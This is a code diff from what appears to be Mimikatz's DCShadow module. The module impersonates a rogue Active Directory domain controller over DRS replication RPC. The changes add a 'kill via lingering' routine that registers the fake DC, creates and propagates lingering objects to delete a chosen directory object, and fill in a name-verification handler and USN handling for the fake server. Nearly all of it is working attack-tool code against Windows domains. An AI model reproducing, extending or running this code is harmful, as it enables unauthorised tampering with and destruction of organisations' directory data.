+								kprintf(L"== Press Any Key to stop ==\n");
+								getchar();
+							}
+							else
+							{
+								kprintf(L"== Press Control+C to stop ==\n");
+								SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, TRUE);
+								WaitForSingleObject(pDCShadowDomainInfoInUse->hGetNCChangeCalled, INFINITE);
+								SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, FALSE);
+								// wait for the RPC call to complete and the Drs Bind to be close by the DC
+								Sleep(500);
+							}
+							kull_m_rpc_drsr_stop_server();
 						}
-						kull_m_rpc_drsr_stop_server();
 					}
-				}
-				else
-				{
-					if(fPush || fManualRegister)
+					else
 					{
-						kprintf(L"** Performing Registration **\n\n");
-						status = kuhl_m_lsadump_dcshadow_register(pDCShadowDomainInfoInUse);
-						// avoid unregistering a non registered DC
-						if(fPush)
-							fManualUnregister = TRUE;
-					}
-					if(NT_SUCCESS(status) && (fPush || fManualPush ))
-					{
-						kprintf(L"** Performing Push **\n\n");
-						status = kuhl_m_lsadump_dcshadow_push(pDCShadowDomainInfoInUse);
-					}
-					if(NT_SUCCESS(status) && fManualUnregister)
-					{
-						kprintf(L"** Performing Unregistration **\n\n");
-						status = kuhl_m_lsadump_dcshadow_unregister(pDCShadowDomainInfoInUse);
+						BOOL fPropagateLingering = FALSE;
+						if(fPush || fManualRegister || fKillViaLingering)
+						{
+							kprintf(L"** Performing Registration **\n\n");
+							status = kuhl_m_lsadump_dcshadow_register(pDCShadowDomainInfoInUse);
+							// avoid unregistering a non registered DC
+							if(!status && (fPush || fKillViaLingering))
+								fManualUnregister = TRUE;
+						}
+						if(NT_SUCCESS(status) && (fPush || fManualPush ))
+						{
+							kprintf(L"** Performing Push **\n\n");
+							status = kuhl_m_lsadump_dcshadow_push(pDCShadowDomainInfoInUse);
+						}
+						if (NT_SUCCESS(status) && (fKillViaLingering))
+						{
+							kprintf(L"** Performing Initial Lingering **\n\n");
+							status = kuhl_m_lsadump_dcshadow_lingering_initial(pDCShadowDomainInfoInUse, szObjectToKill);
+							fPropagateLingering = (status == STATUS_SUCCESS);
+						}
+						if(NT_SUCCESS(status) && fManualUnregister)
+						{
+							kprintf(L"** Performing Unregistration **\n\n");
+							status = kuhl_m_lsadump_dcshadow_unregister(pDCShadowDomainInfoInUse);
+						}
+						if (NT_SUCCESS(status) && fPropagateLingering)
+						{
+							kprintf(L"** Propagate Lingering **\n\n");
+							status = kuhl_m_lsadump_dcshadow_lingering_propagate(pDCShadowDomainInfoInUse, szObjectToKill);
+						}
 					}
 				}
 			}
+			else PRINT_ERROR(L"no object to push\n");
 		}
-		else PRINT_ERROR(L"no object to push");
+		else PRINT_ERROR(L"ldap 0x%x (%u)\n", status, status);
 		kuhl_m_lsadump_dcshadow_clean_domain_info(pDCShadowDomainInfoInUse);
 	}
 	pDCShadowDomainInfoInUse = NULL;
@@ -2352,13 +2820,28 @@ void __RPC_USER SRV_DRS_HANDLE_rundown(DRS_HANDLE hDrs)
 ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs)
 {
 	ULONG status, size;
+	/*
+	BYTE buffer[256];
+	DWORD dwSize = sizeof(buffer);
+	DWORD format = 0;
+	char hoststr[NI_MAXHOST];
+	char portstr[NI_MAXSERV];
+	
+	if (I_RpcServerInqRemoteConnAddress(rpc_handle, buffer, &dwSize, &format) == STATUS_SUCCESS)
+	{
+		if (getnameinfo((struct sockaddr *)buffer, dwSize, hoststr, sizeof(hoststr), portstr, sizeof(portstr), NI_NUMERICHOST | NI_NUMERICSERV) == STATUS_SUCCESS)
+		{
+			kprintf(L"Incoming connection from %S:%S\n", hoststr, portstr);
+		}
+	}
+	*/
 	if(pextClient && ppextServer && phDrs && ((PDRS_EXTENSIONS_INT) pextClient)->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
 	{
 		if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_GETCHGREPLY_V6)
 		{
 			if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_STRONG_ENCRYPTION)
 			{
-				size = (((PDRS_EXTENSIONS_INT) pextClient)->cb >= (ULONG) FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt)) ? FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) : FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid);
+				size = ((PDRS_EXTENSIONS_INT) pextClient)->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) ? FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) : FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid);
 				if(*ppextServer = (DRS_EXTENSIONS *) midl_user_allocate(size))
 				{
 					RtlZeroMemory(*ppextServer, size);
@@ -2366,7 +2849,7 @@ ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS 
 					((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags = DRS_EXT_BASE | DRS_EXT_RESTORE_USN_OPTIMIZATION | DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8;
 					if(pDCShadowDomainInfoInUse->fUseSchemaSignature)
 						((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags |= DRS_EXT_POST_BETA3;
-					if(size >= (ULONG) FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt))
+					if(size >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt))
 						((PDRS_EXTENSIONS_INT) *ppextServer)->dwReplEpoch = (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) ? (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) : pDCShadowDomainInfoInUse->dwReplEpoch;
 				}
 				if(*phDrs = MIDL_user_allocate(sizeof(DWORD)))
@@ -2430,7 +2913,7 @@ ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHG
 			if(pmsgOut->V6.pNC = (DSNAME *) MIDL_user_allocate(pmsgIn->V8.pNC->structLen))
 				RtlCopyMemory(pmsgOut->V6.pNC, pmsgIn->V8.pNC, pmsgIn->V8.pNC->structLen);
 			RtlZeroMemory(&pmsgOut->V6.usnvecFrom, sizeof(USN_VECTOR));
-			pmsgOut->V6.usnvecTo.usnHighObjUpdate = pmsgOut->V6.usnvecTo.usnHighPropUpdate = 42;
+			pmsgOut->V6.usnvecTo.usnHighObjUpdate = pmsgOut->V6.usnvecTo.usnHighPropUpdate = pDCShadowDomainInfoInUse->maxDCUsn;
 			pmsgOut->V6.usnvecTo.usnReserved = 0;
 			if(pmsgOut->V6.pUpToDateVecSrc = (UPTODATE_VECTOR_V2_EXT *) MIDL_user_allocate(sizeof(UPTODATE_VECTOR_V2_EXT))) // 1 included
 			{
@@ -2440,13 +2923,13 @@ ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHG
 				pmsgOut->V6.pUpToDateVecSrc->dwReserved2 = 0;
 
 				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].uuidDsa = pDCShadowDomainInfoInUse->mimiDc.InstanceId;
-				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].usnHighPropUpdate = 42;
+				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].usnHighPropUpdate = pDCShadowDomainInfoInUse->maxDCUsn;
 				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].timeLastSyncSuccess = (*(PULONGLONG) &ft) / 10000;
 			}
 
 			RtlZeroMemory(&pmsgOut->V6.PrefixTableSrc, sizeof(SCHEMA_PREFIX_TABLE));
 			pmsgOut->V6.ulExtendedRet = 0x00000001; //EXOP_ERR_SUCCESS
-			pmsgOut->V6.cNumObjects = pDCShadowDomainInfoInUse->request->cNumObjects;
+			pmsgOut->V6.cNumObjects = (pDCShadowDomainInfoInUse->request? pDCShadowDomainInfoInUse->request->cNumObjects : 0);
 			pmsgOut->V6.cNumBytes = 0; // srly ???
 			
 			if(hBinding = I_RpcGetCurrentCallHandle())
@@ -2463,6 +2946,8 @@ ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHG
 					}
 				}
 			}
+
+			kuhl_m_lsadump_dcshadow_init_prefixtable(&pmsgOut->V6.PrefixTableSrc);
 
 			pCurrentReplObject = &pmsgOut->V6.pObjects;
 			for(i = 0; i < pmsgOut->V6.cNumObjects; i++)
@@ -2503,9 +2988,11 @@ ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHG
 
 			if(SessionKey.SessionKey)
 				FreeContextBuffer(SessionKey.SessionKey);
+
+			kprintf(L"%u object(s) pushed\n", pmsgOut->V6.cNumObjects);
+			if (pmsgOut->V6.cNumObjects)
+				SetEvent(pDCShadowDomainInfoInUse->hGetNCChangeCalled);
 		}
-		kprintf(L"%u object(s) pushed\n", pmsgOut->V6.cNumObjects);
-		SetEvent(pDCShadowDomainInfoInUse->hGetNCChangeCalled);
 		status = STATUS_SUCCESS;
 	}
 	else status = ERROR_REVISION_MISMATCH;
@@ -2514,7 +3001,20 @@ ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHG
 
 ULONG SRV_IDL_DRSVerifyNames(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_VERIFYREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_VERIFYREPLY *pmsgOut)
 {
-	return STATUS_NOT_IMPLEMENTED;
+	DWORD i;
+	if (dwInVersion != 1)
+		return ERROR_REVISION_MISMATCH;
+	for(i = 0 ; i <pmsgIn->V1.cNames; i++)
+	{
+		kprintf(L"  Verify Name for: %s\n", pmsgIn->V1.rpNames[i]->StringName);
+	}
+	*pdwOutVersion = 1;
+	ZeroMemory(pmsgOut, sizeof(DRS_MSG_VERIFYREPLY));
+	pmsgOut->V1.error = 0;
+	pmsgOut->V1.cNames = pmsgIn->V1.cNames;
+	pmsgOut->V1.rpEntInf = (ENTINF*)MIDL_user_allocate(sizeof(ENTINF) * pmsgIn->V1.cNames);
+	ZeroMemory(pmsgOut->V1.rpEntInf, sizeof(ENTINF) * pmsgIn->V1.cNames);
+    return ERROR_SUCCESS;
 }
 
 // this function is here to acknowledge that we add a DC in our own replication list
